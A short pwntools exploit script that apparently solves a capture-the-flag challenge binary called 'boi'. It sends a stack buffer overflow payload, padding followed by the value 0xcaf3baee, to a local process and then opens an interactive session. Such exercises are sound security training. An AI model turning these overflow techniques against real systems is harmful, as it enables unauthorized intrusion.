#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./boi")
p = process(elf.path)

payload = b"A" * 0x14
payload += p32(0xcaf3baee)

p.sendline(payload)
p.interactive()
